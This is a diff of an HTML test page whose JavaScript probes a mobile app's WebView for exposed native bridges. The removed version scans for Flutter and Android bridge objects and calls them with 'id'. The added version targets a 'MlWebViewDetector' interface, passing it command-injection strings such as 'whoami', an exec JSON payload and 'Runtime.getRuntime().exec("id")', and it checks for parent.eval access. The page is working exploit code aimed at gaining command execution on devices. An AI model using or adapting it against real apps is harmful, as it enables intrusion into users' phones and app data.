@@ -1,149 +1,107 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Find Real Flutter Bridge</title>
+    <title>Test MlWebViewDetector</title>
     <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
-        .bridge { color: #ff0; font-weight: bold; }
-        .danger { color: red; }
+        body { font-family: monospace; background: black; color: lime; padding: 20px; }
+        .success { color: #0f0; }
+        .testing { color: #ff0; }
     </style>
 </head>
 <body>
-    <h2 class="danger">🎯 Finding Flutter JavaScript Bridge</h2>
-    <div id="log"></div>
+    <h2>🔍 Testing MlWebViewDetector Interface</h2>
+    <div id="output"></div>
     
     <script>
-        var log = document.getElementById('log');
-        log.innerHTML = 'Scanning for Flutter bridges...<br><hr>';
+        var out = document.getElementById('output');
         
-        // Look for NON-STANDARD objects (not part of normal browser)
-        var standardObjects = [
-            'window', 'document', 'navigator', 'console', 'location',
-            'history', 'screen', 'localStorage', 'sessionStorage',
-            'parent', 'top', 'self', 'frames', 'eval', 'XMLHttpRequest',
-            'FileReader', 'ReadableStream', 'WritableStream', 'Event',
-            'Promise', 'Array', 'Object', 'String', 'Number', 'Boolean',
-            'Date', 'Math', 'JSON', 'RegExp', 'Error', 'Set', 'Map',
-            'WeakSet', 'WeakMap', 'ArrayBuffer', 'DataView', 'Int8Array',
-            'Uint8Array', 'Float32Array', 'Symbol', 'Proxy', 'Reflect'
-        ];
-        
-        var foundBridges = [];
-        
-        for(var key in window) {
-            // Skip standard browser objects
-            if(standardObjects.includes(key)) continue;
+        if(window.MlWebViewDetector) {
+            out.innerHTML += '✅ <b>MlWebViewDetector FOUND!</b><br>';
+            out.innerHTML += 'Type: ' + typeof window.MlWebViewDetector + '<br>';
             
-            try {
-                var obj = window[key];
-                if(obj && typeof obj === 'object') {
-                    foundBridges.push({
-                        name: key,
-                        type: typeof obj,
-                        methods: Object.getOwnPropertyNames(obj).slice(0, 10) // First 10 methods
-                    });
-                }
-            } catch(e) {}
-        }
-        
-        // Display results
-        if(foundBridges.length === 0) {
-            log.innerHTML += '❌ No non-standard objects found<br>';
-            log.innerHTML += 'Trying common Flutter bridge names...<br><br>';
+            // List all methods
+            var methods = Object.getOwnPropertyNames(window.MlWebViewDetector);
+            out.innerHTML += 'Methods: ' + methods.join(', ') + '<br><br>';
             
-            // Try common names directly
-            var commonNames = [
-                'flutter', 'Flutter', 'flutter_inappwebview',
-                'Android', 'android', 'App', 'channel', 'JSBridge',
-                'webview', 'WebView', 'native', 'Native', 'bridge',
-                'Bridge', 'js', 'JS', 'platform', 'Platform'
-            ];
-            
-            commonNames.forEach(name => {
-                if(window[name]) {
-                    log.innerHTML += '✅ Found: <span class="bridge">window.' + name + '</span><br>';
-                    var methods = Object.getOwnPropertyNames(window[name]);
-                    log.innerHTML += 'Methods: ' + methods.join(', ') + '<br><br>';
-                    
-                    // Try to call it
-                    try {
-                        var result = window[name]('{"method":"test"}');
-                        log.innerHTML += 'Call result: ' + result + '<br>';
-                    } catch(e) {
-                        log.innerHTML += 'Call error: ' + e.message + '<br>';
-                    }
-                }
-            });
-        } else {
-            log.innerHTML += '✅ Found ' + foundBridges.length + ' non-standard objects:<br><br>';
-            
-            foundBridges.forEach(bridge => {
-                log.innerHTML += '<span class="bridge">📌 ' + bridge.name + '</span><br>';
-                log.innerHTML += 'Methods: ' + bridge.methods.join(', ') + '<br>';
+            // Try the onCatch method you saw
+            if(window.MlWebViewDetector.onCatch) {
+                out.innerHTML += '<span class="testing">Testing onCatch method...</span><br>';
                 
-                // Try a simple call
-                try {
-                    var testResult = window[bridge.name]('test');
-                    log.innerHTML += 'Simple call: ' + testResult + '<br>';
-                } catch(e) {}
+                // Try different calls
+                var testCalls = [
+                    'id',
+                    'whoami',
+                    '{"command":"id"}',
+                    '{"action":"exec","cmd":"id"}',
+                    'exec:id',
+                    'Runtime.getRuntime().exec("id")'
+                ];
                 
-                log.innerHTML += '<br>';
-            });
-        }
-        
-        log.innerHTML += '<hr>';
-        log.innerHTML += '<h3 class="danger">🚀 DIRECT FLUTTER BRIDGE TEST</h3>';
-        
-        // Direct test for Flutter's common bridge
-        setTimeout(() => {
-            if(window.flutter_inappwebview) {
-                log.innerHTML += '🔍 flutter_inappwebview FOUND!<br>';
-                // This is a common Flutter WebView plugin
-                try {
-                    window.flutter_inappwebview.callHandler('handlerName', 'id')
-                        .then(function(result) {
-                            log.innerHTML += '✅ Handler result: ' + result + '<br>';
-                        });
-                } catch(e) {
-                    log.innerHTML += 'Error: ' + e.message + '<br>';
-                }
-            }
-            
-            // Try window.$flutterHandler (another common pattern)
-            if(window.$flutterHandler) {
-                log.innerHTML += '🔍 $flutterHandler FOUND!<br>';
-                try {
-                    window.$flutterHandler.postMessage('id');
-                } catch(e) {}
-            }
-        }, 1000);
-        
-        // Last resort: check the entire window object
-        log.innerHTML += '<br>🔍 Full scan (this may take a moment)...<br>';
-        
-        setTimeout(() => {
-            var allProps = [];
-            for(var prop in window) {
-                allProps.push(prop);
-            }
-            
-            // Look for patterns
-            var flutterLike = allProps.filter(p => 
-                p.toLowerCase().includes('flutter') ||
-                p.toLowerCase().includes('android') ||
-                p.toLowerCase().includes('channel') ||
-                p.toLowerCase().includes('bridge') ||
-                p.toLowerCase().includes('native') ||
-                p.toLowerCase().includes('webview')
-            );
-            
-            if(flutterLike.length > 0) {
-                log.innerHTML += '<br>🎯 Flutter-like properties:<br>';
-                flutterLike.forEach(prop => {
-                    log.innerHTML += '• ' + prop + '<br>';
+                testCalls.forEach((call, i) => {
+                    setTimeout(() => {
+                        try {
+                            out.innerHTML += 'Trying: ' + call + ' → ';
+                            var result = window.MlWebViewDetector.onCatch(call);
+                            if(result !== undefined) {
+                                out.innerHTML += '<span class="success">' + result + '</span><br>';
+                            } else {
+                                out.innerHTML += 'no response<br>';
+                            }
+                        } catch(e) {
+                            out.innerHTML += 'error: ' + e.message + '<br>';
+                        }
+                    }, i * 500);
                 });
             }
-        }, 2000);
+            
+            // Also check if MlWebViewDetector is a function itself
+            if(typeof window.MlWebViewDetector === 'function') {
+                out.innerHTML += '<br><span class="testing">MlWebViewDetector is a function, calling it...</span><br>';
+                try {
+                    var result = window.MlWebViewDetector('test');
+                    out.innerHTML += 'Result: ' + result + '<br>';
+                } catch(e) {
+                    out.innerHTML += 'Error: ' + e.message + '<br>';
+                }
+            }
+            
+        } else {
+            out.innerHTML += '❌ MlWebViewDetector not found<br>';
+            
+            // Check for other suspicious objects
+            out.innerHTML += '<br>🔍 Looking for other custom objects...<br>';
+            var customObjects = [];
+            for(var key in window) {
+                // Skip standard objects
+                if(key.length > 5 && !key.startsWith('HTML') && !key.startsWith('XML') && 
+                   key !== 'document' && key !== 'window' && key !== 'navigator' &&
+                   key !== 'location' && key !== 'console') {
+                    customObjects.push(key);
+                }
+            }
+            
+            if(customObjects.length > 0) {
+                out.innerHTML += 'Found: ' + customObjects.join(', ') + '<br>';
+            }
+        }
+        
+        // Also test if we can call eval (you had this earlier)
+        setTimeout(() => {
+            out.innerHTML += '<br><hr><h3>🚀 Testing eval access</h3>';
+            try {
+                out.innerHTML += 'parent.eval exists: ' + (typeof parent.eval) + '<br>';
+                out.innerHTML += 'top.eval exists: ' + (typeof top.eval) + '<br>';
+                out.innerHTML += 'window.eval exists: ' + (typeof window.eval) + '<br>';
+                
+                // Try a simple eval
+                if(typeof parent.eval === 'function') {
+                    out.innerHTML += '<span class="testing">Trying parent.eval("alert(1)")...</span><br>';
+                    // parent.eval('alert("Test from eval")');
+                }
+            } catch(e) {
+                out.innerHTML += 'Eval error: ' + e.message + '<br>';
+            }
+        }, 3000);
     </script>
 </body>
 </html>
